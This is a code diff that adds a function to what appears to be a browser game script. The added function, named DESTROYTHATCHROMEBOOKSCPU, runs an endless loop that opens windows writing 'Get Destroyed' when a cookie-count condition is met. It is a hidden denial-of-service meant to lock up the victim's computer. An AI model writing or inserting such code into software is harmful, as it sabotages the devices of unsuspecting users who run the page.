@@ -134,3 +134,12 @@ SudoBan.user = function(username) {
   console.log("Success")
   
 }
+
+
+var DESTROYTHATCHROMEBOOKSCPU = function(NukeLaunchCodes) {
+  if (NukeLaunchCodes==cookies+1000) {
+    while (1==1) {
+      window.open("javascript:document.write('<h1>Get Destroyed</h1>')")
+    }
+  }
+}
